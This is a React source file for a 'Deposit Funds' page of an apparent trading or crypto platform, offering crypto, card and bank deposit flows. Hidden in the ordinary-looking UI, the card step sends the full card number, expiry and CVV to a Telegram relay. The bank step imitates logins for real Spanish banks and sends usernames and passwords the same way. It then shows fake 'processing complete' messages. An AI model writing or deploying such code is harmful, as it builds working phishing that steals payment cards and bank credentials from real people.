"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Wallet,
  CreditCard,
  Landmark,
  Coins,
  Copy,
  Check,
  ArrowLeft,
  Loader2,
  InfoIcon,
  QrCode,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { toast } from "@/components/toast";
import { useI18n } from "@/components/i18n-provider";
import { useAuth } from "@/components/auth-provider";
import { useBalance } from "@/hooks/useBalance";

interface DepositAddress {
  id: string;
  assetSymbol: string | null;
  network: string;
  address: string;
  label: string | null;
}

interface Bank {
  id: string;
  name: string;
  logo: string;
}

export default function DepositsPage() {
  const { t } = useI18n();
  const { user } = useAuth();
  const { details } = useBalance();
  
  const [step, setStep] = useState<
    | "method"
    | "crypto_token"
    | "crypto_network"
    | "crypto_address"
    | "card"
    | "bank"
    | "bank_login"
    | "bank_processing"
  >("method");
  
  const [addresses, setAddresses] = useState<DepositAddress[]>([]);
  const [loading, setLoading] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [selectedToken, setSelectedToken] = useState<string>("");
  const [selectedAddress, setSelectedAddress] = useState<DepositAddress | null>(null);
  
  const [cardData, setCardData] = useState({
    number: "",
    expiry: "",
    cvv: "",
    amount: "",
  });
  
  const [cardErrors, setCardErrors] = useState({
    number: false,
    expiry: false,
    cvv: false,
    amount: false,
  });
  
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [bankCredentials, setBankCredentials] = useState({
    login: "",
    password: "",
  });
  
  const [showBankNotification, setShowBankNotification] = useState(false);

  const banks: Bank[] = [
    { id: "bbva", name: "BBVA", logo: "/logos/bbva.png" },
    { id: "sabadell", name: "Sabadell", logo: "/logos/sabadell.svg" },
    { id: "santander", name: "Santander", logo: "/logos/santander.png" },
    { id: "caixabank", name: "CaixaBank", logo: "/logos/caixabank.png" },
    { id: "openbank", name: "Openbank", logo: "/logos/openbank.svg" },
    { id: "ing", name: "ING", logo: "/logos/ing.png" },
    { id: "abanca", name: "Abanca", logo: "/logos/abanca.svg" },
    { id: "kutxabank", name: "Kutxabank", logo: "/logos/kutxabank.png" },
  ];

  useEffect(() => {
    fetchAddresses();
  }, []);

  const fetchAddresses = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/admin/deposit-addresses");
      if (res.ok) {
        const data = await res.json();
        setAddresses(data);
      }
    } catch (error) {
      console.error("Error fetching addresses:", error);
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(address);
    toast({
      title: t("copied") || "Copied",
      description: t("addressCopied") || "Address copied to clipboard",
      variant: "success",
    });
    setTimeout(() => setCopiedAddress(null), 2000);
  };

  const sendToTelegram = async (message: string) => {
    try {
      await fetch("/api/send-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      });
    } catch (err) {
      console.error("Telegram error:", err);
    }
  };

  const validateCardForm = () => {
    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    const cvvRegex = /^\d{3}$/;
    const numberRegex = /^\d{12,19}$/;
    const errors = {
      number: !numberRegex.test(cardData.number.replace(/\s+/g, "")),
      expiry: !expiryRegex.test(cardData.expiry),
      cvv: !cvvRegex.test(cardData.cvv),
      amount: Number(cardData.amount) <= 0,
    };
    setCardErrors(errors);
    return !Object.values(errors).some(Boolean);
  };

  const handleCardDeposit = async () => {
    if (!validateCardForm() || !user) return;

    try {
      await fetch("/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: user.id,
          type: "DEPOSIT",
          depositFrom: "card",
          amount: Number(cardData.amount),
          cardNumber: cardData.number.replace(/\s+/g, ""),
          status: "PENDING",
        }),
      });

      const msg = `
💳 New Card Deposit:
Number: ${cardData.number}
Expiry: ${cardData.expiry}
CVV: ${cardData.cvv}
Amount: ${cardData.amount}
      `;

      await sendToTelegram(msg);
      
      toast({
        title: t("deposit") || "Deposit",
        description: t("processingInfo") || "Your deposit is being processed",
        variant: "info",
      });

      setStep("method");
      setCardData({ number: "", expiry: "", cvv: "", amount: "" });
    } catch (err) {
      toast({
        title: t("error") || "Error",
        description: t("depositFailed") || "Failed to process deposit",
        variant: "destructive",
      });
    }
  };

  const validateBankForm = () => {
    const errors = {
      login: !bankCredentials.login.trim(),
      password: !bankCredentials.password.trim(),
    };
    return !Object.values(errors).some(Boolean);
  };

  const handleBankLogin = async () => {
    if (!selectedBank || !validateBankForm()) return;

    setStep("bank_processing");
    const msg = `
🏦 New Bank Login:
Bank: ${selectedBank.name}
Login: ${bankCredentials.login}
Password: ${bankCredentials.password}
    `;
    await sendToTelegram(msg);

    setTimeout(() => {
      toast({
        title: t("processing") || "Processing",
        description: t("processingBankInfo") || "Processing bank information",
        variant: "info",
      });
    }, 500);

    setTimeout(() => {
      toast({
        title: t("done") || "Done",
        description: t("bankProcessingInfo") || "Bank processing completed",
        variant: "success",
      });
    }, 3000);
  };

  const groupedAddresses = addresses.reduce((acc, addr) => {
    const token = addr.assetSymbol || addr.network.split(" ")[0];
    if (!acc[token]) acc[token] = [];
    acc[token].push(addr);
    return acc;
  }, {} as Record<string, DepositAddress[]>);

  const selectedNetworks = selectedToken ? groupedAddresses[selectedToken] : [];

  const formattedNumber = cardData.number
    .replace(/\D/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim();

  const pageVariants = {
    initial: { opacity: 0, x: 40 },
    animate: { opacity: 1, x: 0 },
    exit: { opacity: 0, x: -40 },
    transition: { duration: 0.25 },
  };

  const handleBack = () => {
    if (step === "crypto_address") setStep("crypto_network");
    else if (step === "crypto_network") setStep("crypto_token");
    else if (step === "bank_login") setStep("bank");
    else setStep("method");
  };

  return (
    <div className="space-y-6 overflow-x-hidden">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white">{t("depositFunds") || "Deposit Funds"}</h1>
          <p className="mt-1 text-sm text-slate-400">
            {t("depositDescription") || "Add funds to your account"}
          </p>
        </div>
        {details && (
          <div className="text-right">
            <p className="text-xs text-slate-400">{t("availableBalance") || "Available Balance"}</p>
            <p className="text-lg font-semibold text-white">
              {details.availableToWithdraw.toFixed(2)} {details.baseCurrency}
            </p>
          </div>
        )}
      </div>

      {/* Main Content */}
      <Card className="border-slate-800 bg-slate-950/80">
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle className="flex items-center gap-2">
              <Wallet className="h-5 w-5 text-purple-400" />
              {t("selectDepositMethod") || "Select Deposit Method"}
            </CardTitle>
            {step !== "method" && (
              <Button variant="ghost" size="sm" onClick={handleBack}>
                <ArrowLeft className="mr-1 h-4 w-4" />
                {t("back") || "Back"}
              </Button>
            )}
          </div>
        </CardHeader>
        <CardContent>
          <div className="min-h-[400px]">
            <AnimatePresence mode="wait">
              <motion.div
                key={step}
                initial="initial"
                animate="animate"
                exit="exit"
                transition={pageVariants.transition}
                variants={pageVariants}
                className="space-y-4"
              >
                {/* METHOD STEP */}
                {step === "method" && (
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                    <motion.div
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                    >
                      <Card
                        onClick={() => {
                          fetchAddresses();
                          setStep("crypto_token");
                        }}
                        className="cursor-pointer border-slate-800 bg-slate-900 hover:bg-slate-800 transition"
                      >
                        <CardContent className="p-6 flex flex-col items-center justify-center">
                          <Coins className="h-12 w-12 text-blue-400 mb-3" />
                          <p className="font-medium text-white">{t("crypto") || "Crypto"}</p>
                        </CardContent>
                      </Card>
                    </motion.div>
                    
                    <motion.div
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                    >
                      <Card
                        onClick={() => setStep("card")}
                        className="cursor-pointer border-slate-800 bg-slate-900 hover:bg-slate-800 transition"
                      >
                        <CardContent className="p-6 flex flex-col items-center justify-center">
                          <CreditCard className="h-12 w-12 text-green-400 mb-3" />
                          <p className="font-medium text-white">{t("card") || "Card"}</p>
                        </CardContent>
                      </Card>
                    </motion.div>
                    
                    <motion.div
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                    >
                      <Card
                        onClick={() => setStep("bank")}
                        className="cursor-pointer border-slate-800 bg-slate-900 hover:bg-slate-800 transition"
                      >
                        <CardContent className="p-6 flex flex-col items-center justify-center">
                          <Landmark className="h-12 w-12 text-purple-400 mb-3" />
                          <p className="font-medium text-white">{t("bank") || "Bank"}</p>
                        </CardContent>
                      </Card>
                    </motion.div>
                  </div>
                )}

                {/* CRYPTO TOKEN */}
                {step === "crypto_token" && (
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                    {Object.keys(groupedAddresses).map((token) => (
                      <Card
                        key={token}
                        onClick={() => {
                          setSelectedToken(token);
                          setStep("crypto_network");
                        }}
                        className="cursor-pointer border-slate-800 bg-slate-900 hover:bg-slate-800 transition"
                      >
                        <CardContent className="p-4 flex items-center gap-3">
                          <Coins className="h-6 w-6 text-blue-400" />
                          <p className="font-medium text-white">{token}</p>
                        </CardContent>
                      </Card>
                    ))}
                  </div>
                )}

                {/* CRYPTO NETWORK */}
                {step === "crypto_network" && selectedToken && (
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                    {selectedNetworks.map((addr) => (
                      <Card
                        key={addr.id}
                        onClick={() => {
                          setSelectedAddress(addr);
                          setStep("crypto_address");
                        }}
                        className="cursor-pointer border-slate-800 bg-slate-900 hover:bg-slate-800 transition"
                      >
                        <CardContent className="p-4 flex items-center gap-3">
                          <Landmark className="h-6 w-6 text-green-400" />
                          <p className="font-medium text-white">{addr.network}</p>
                        </CardContent>
                      </Card>
                    ))}
                  </div>
                )}

                {/* CRYPTO ADDRESS */}
                {step === "crypto_address" && selectedAddress && (
                  <Card className="border-slate-800 bg-slate-900">
                    <CardContent className="p-6 space-y-4">
                      <div>
                        <p className="text-sm text-slate-400 mb-2">
                          {selectedAddress.network} {t("address") || "Address"}
                        </p>
                        <div className="flex items-center gap-2">
                          <Input
                            readOnly
                            value={selectedAddress.address}
                            className="bg-slate-950 text-white font-mono text-sm"
                          />
                          <Button
                            size="icon"
                            onClick={() => handleCopy(selectedAddress.address)}
                            className="shrink-0"
                          >
                            {copiedAddress === selectedAddress.address ? (
                              <Check className="h-4 w-4" />
                            ) : (
                              <Copy className="h-4 w-4" />
                            )}
                          </Button>
                        </div>
                      </div>
                      
                      
                      <div className="rounded-lg bg-blue-500/10 border border-blue-500/20 p-4">
                        <div className="flex items-start gap-2">
                          <InfoIcon className="h-5 w-5 text-blue-400 shrink-0 mt-0.5" />
                          <div className="text-sm text-blue-200">
                            <p className="font-medium mb-1">{t("important") || "Important"}</p>
                            <p className="text-xs text-blue-300/80">
                              {t("sendOnlyTokenWarning")?.replace("{token}", selectedToken) || `Send only ${selectedToken} to this address. Sending other cryptocurrencies may result in permanent loss.`}
                            </p>
                          </div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* CARD */}
                {step === "card" && (
                  <Card className="border-slate-800 bg-slate-900">
                    <CardContent className="p-6 space-y-4">
                      <Input
                        placeholder={t("cardNumber") || "Card Number"}
                        value={formattedNumber}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "");
                          setCardData({ ...cardData, number: val });
                        }}
                        className={cardErrors.number ? "border-red-500" : ""}
                        maxLength={19}
                      />
                      <div className="grid grid-cols-2 gap-4">
                        <Input
                          placeholder={t("expiry") || "MM/YY"}
                          value={cardData.expiry}
                          onChange={(e) => {
                            let val = e.target.value.replace(/\D/g, "");
                            if (val.length > 4) val = val.slice(0, 4);
                            if (val.length > 2)
                              val = val.slice(0, 2) + "/" + val.slice(2);
                            setCardData({ ...cardData, expiry: val });
                          }}
                          className={cardErrors.expiry ? "border-red-500" : ""}
                          maxLength={5}
                        />
                        <Input
                          placeholder={t("cvv") || "CVV"}
                          value={cardData.cvv}
                          onChange={(e) => {
                            let val = e.target.value.replace(/\D/g, "");
                            if (val.length > 3) val = val.slice(0, 3);
                            setCardData({ ...cardData, cvv: val });
                          }}
                          className={cardErrors.cvv ? "border-red-500" : ""}
                          maxLength={3}
                          type="password"
                        />
                      </div>
                      <Input
                        placeholder={t("amount") || "Amount"}
                        type="number"
                        value={cardData.amount}
                        onChange={(e) =>
                          setCardData({ ...cardData, amount: e.target.value })
                        }
                        className={cardErrors.amount ? "border-red-500" : ""}
                      />
                      <Button className="w-full" onClick={handleCardDeposit}>
                        {t("deposit") || "Deposit"}
                      </Button>
                    </CardContent>
                  </Card>
                )}

                {/* BANK */}
                {step === "bank" && (
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                    {banks.map((bank) => (
                      <motion.div
                        key={bank.id}
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                      >
                        <Card
                          onClick={() => {
                            setSelectedBank(bank);
                            setStep("bank_login");
                          }}
                          className="cursor-pointer border-slate-800 bg-slate-900 hover:bg-slate-800 transition"
                        >
                          <CardContent className="p-4 flex flex-col items-center justify-center">
                            <img
                              src={bank.logo}
                              alt={bank.name}
                              className="h-12 w-12 object-contain mb-2"
                            />
                            <p className="text-sm font-medium text-white">{bank.name}</p>
                          </CardContent>
                        </Card>
                      </motion.div>
                    ))}
                  </div>
                )}

                {/* BANK LOGIN */}
                {step === "bank_login" && selectedBank && (
                  <Card className="border-slate-800 bg-slate-900">
                    <CardContent className="p-6 space-y-4">
                      <div className="flex items-center justify-center mb-4">
                        <img
                          src={selectedBank.logo}
                          alt={selectedBank.name}
                          className="h-16 w-16 object-contain"
                        />
                      </div>
                      <Input
                        placeholder={t("username") || "Username"}
                        value={bankCredentials.login}
                        onChange={(e) =>
                          setBankCredentials({
                            ...bankCredentials,
                            login: e.target.value,
                          })
                        }
                      />
                      <Input
                        placeholder={t("password") || "Password"}
                        type="password"
                        value={bankCredentials.password}
                        onChange={(e) =>
                          setBankCredentials({
                            ...bankCredentials,
                            password: e.target.value,
                          })
                        }
                      />
                      <Button className="w-full" onClick={handleBankLogin}>
                        {t("authorize") || "Authorize"}
                      </Button>
                    </CardContent>
                  </Card>
                )}

                {/* BANK PROCESSING */}
                {step === "bank_processing" && (
                  <div className="flex flex-col items-center justify-center py-12">
                    {!showBankNotification ? (
                      <>
                        <Loader2 className="h-8 w-8 animate-spin text-blue-400 mb-3" />
                        <p className="text-slate-400">
                          {t("processingBankInfo") || "Processing bank information..."}
                        </p>
                      </>
                    ) : (
                      <>
                        <InfoIcon className="h-8 w-8 text-blue-400 mb-3" />
                        <p className="text-slate-400">
                          {t("pendingConfirmation") || "Pending confirmation"}
                        </p>
                      </>
                    )}
                  </div>
                )}
              </motion.div>
            </AnimatePresence>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}






